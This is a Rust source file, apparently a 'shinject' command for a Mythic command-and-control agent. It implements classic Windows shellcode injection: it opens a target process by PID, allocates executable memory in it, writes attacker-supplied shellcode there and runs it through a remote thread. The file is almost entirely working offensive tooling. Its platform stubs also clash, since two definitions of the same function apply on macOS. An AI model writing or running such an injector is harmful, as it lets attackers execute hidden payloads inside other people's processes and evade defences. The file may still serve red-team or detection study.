use serde::{Deserialize, Serialize};
use std::fs;
use crate::{AgentTask, mythic_success, mythic_error};

#[cfg(target_os = "windows")]
use std::mem;
#[cfg(target_os = "windows")]
use std::ptr;
#[cfg(target_os = "windows")]
use winapi::shared::minwindef::{FALSE, DWORD, LPVOID};
#[cfg(target_os = "windows")]
use winapi::shared::basetsd::SIZE_T;
#[cfg(target_os = "windows")]
use winapi::um::processthreadsapi::*;
#[cfg(target_os = "windows")]
use winapi::um::memoryapi::*;
#[cfg(target_os = "windows")]
use winapi::um::handleapi::*;
#[cfg(target_os = "windows")]
use winapi::um::synchapi::*;
#[cfg(target_os = "windows")]
use winapi::um::errhandlingapi::GetLastError;
#[cfg(target_os = "windows")]
use winapi::um::winbase::WAIT_OBJECT_0;

// Command structure for Mythic
#[derive(Serialize, Deserialize)]
pub struct ShinjectArgs {
    pub shellcode: String,  // File ID from Mythic
    pub process_id: u32,
}

/// Wrapper function for compatibility with the tasking system
pub fn inject_shellcode(task: &AgentTask) -> Result<serde_json::Value, Box<dyn std::error::Error>> {
    let args: ShinjectArgs = serde_json::from_str(&task.parameters)?;
    match execute_shinject(args) {
        Ok(output) => Ok(mythic_success!(task.id, output)),
        Err(error) => Ok(mythic_error!(task.id, error)),
    }
}

#[cfg(target_os = "windows")]
#[derive(Serialize)]
pub struct ShinjectResult {
    pub success: bool,
    pub output: String,
    pub error: Option<String>,
}

#[cfg(target_os = "windows")]
const PAGE_EXECUTE_READWRITE: DWORD = 0x40;
#[cfg(target_os = "windows")]
const MEM_COMMIT: DWORD = 0x1000;
#[cfg(target_os = "windows")]
const MEM_RESERVE: DWORD = 0x2000;
#[cfg(target_os = "windows")]
const PROCESS_ALL_ACCESS: DWORD = 0x1F0FFF;
#[cfg(target_os = "windows")]
const INFINITE: DWORD = 0xFFFFFFFF;

// Main command execution function
#[cfg(target_os = "windows")]
pub fn execute_shinject(args: ShinjectArgs) -> Result<String, String> {
    // In a real implementation, you would download the file from Mythic
    // For now, we'll look for it in common locations as a fallback
    
    let shellcode_bytes = match download_shellcode_file(&args.shellcode) {
        Ok(bytes) => bytes,
        Err(e) => return Err(e),
    };

    unsafe {
        match inject_shellcode_impl(args.process_id, &shellcode_bytes) {
            Ok(output) => Ok(output),
            Err(e) => Err(e),
        }
    }
}

// Helper function to locate and read the shellcode file
#[cfg(target_os = "windows")]
fn download_shellcode_file(file_id: &str) -> Result<Vec<u8>, String> {
    // Check common locations where Mythic might download files
    let possible_paths = vec![
        std::env::current_dir().map(|p| p.join(file_id)).unwrap_or_default(),
        std::env::temp_dir().join(file_id),
        std::env::home_dir().unwrap_or_default().join("Downloads").join(file_id),
        std::path::Path::new(file_id).to_path_buf(),
    ];
    
    // Try to read the file from various possible locations
    for path in &possible_paths {
        if path.exists() {
            match fs::read(path) {
                Ok(bytes) => {
                    if bytes.len() > 0 {
                        return Ok(bytes);
                    }
                }
                Err(_) => continue,
            }
        }
    }
    
    Err(format!(
        "Shellcode file '{}' not found in any expected location.\n\n\
        The file should be automatically downloaded by Mythic when delete_after_fetch=True.\n\
        Searched locations:\n- {}\n\n\
        TROUBLESHOOTING:\n\
        1. Verify the file exists in Mythic\n\
        2. Check that delete_after_fetch=True is set\n\
        3. Try manually downloading the file first",
        file_id,
        possible_paths.iter()
            .map(|p| p.to_string_lossy().to_string())
            .collect::<Vec<_>>()
            .join("\n- ")
    ))
}

// Windows shellcode injection implementation
#[cfg(target_os = "windows")]
unsafe fn inject_shellcode_impl(process_id: u32, shellcode: &[u8]) -> Result<String, String> {
    let h_process = OpenProcess(PROCESS_ALL_ACCESS, FALSE, process_id);
    if h_process.is_null() {
        return Err(format!(
            "Failed to open process with PID: {}. Error: {}",
            process_id,
            GetLastError()
        ));
    }

    let buffer_size = shellcode.len();
    let remote_mem = VirtualAllocEx(
        h_process,
        ptr::null_mut(),
        buffer_size,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE,
    );

    if remote_mem.is_null() {
        CloseHandle(h_process);
        return Err("VirtualAllocEx failed".to_string());
    }

    let mut bytes_written: SIZE_T = 0;
    let write_result = WriteProcessMemory(
        h_process,
        remote_mem,
        shellcode.as_ptr() as LPVOID,
        buffer_size,
        &mut bytes_written,
    );

    if write_result == 0 || bytes_written != buffer_size {
        CloseHandle(h_process);
        return Err(format!(
            "WriteProcessMemory failed. Written: {}/{} bytes. Error: {}",
            bytes_written,
            buffer_size,
            GetLastError()
        ));
    }

    let mut thread_id: DWORD = 0;
    let h_thread = CreateRemoteThread(
        h_process,
        ptr::null_mut(),
        0,
        Some(mem::transmute(remote_mem)),
        ptr::null_mut(),
        0,
        &mut thread_id,
    );

    if h_thread.is_null() {
        CloseHandle(h_process);
        return Err("CreateRemoteThread failed".to_string());
    }

    let wait_result = WaitForSingleObject(h_thread, INFINITE);

    // Clean up
    CloseHandle(h_thread);
    CloseHandle(h_process);

    if wait_result == WAIT_OBJECT_0 {
        Ok(format!(
            "Shellcode successfully injected into PID {}. Thread ID: {}\n\n\
            Shellcode Details:\n- Size: {} bytes\n- Process ID: {}\n- Thread ID: {}",
            process_id, thread_id, buffer_size, process_id, thread_id
        ))
    } else {
        Err(format!("WaitForSingleObject failed with result: {}", wait_result))
    }
}

// macOS placeholder implementation
#[cfg(target_os = "macos")]
pub fn execute_shinject(_args: ShinjectArgs) -> Result<String, String> {
    Err("shinject command is not implemented for macOS".to_string())
}

// Fallback for other platforms
#[cfg(not(target_os = "windows"))]
pub fn execute_shinject(_args: ShinjectArgs) -> Result<String, String> {
    Err("shinject command is only supported on Windows".to_string())
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_shinject_args_parsing() {
        let args = ShinjectArgs {
            shellcode: "test_file_id".to_string(),
            process_id: 1234,
        };
        assert_eq!(args.shellcode, "test_file_id");
        assert_eq!(args.process_id, 1234);
    }
}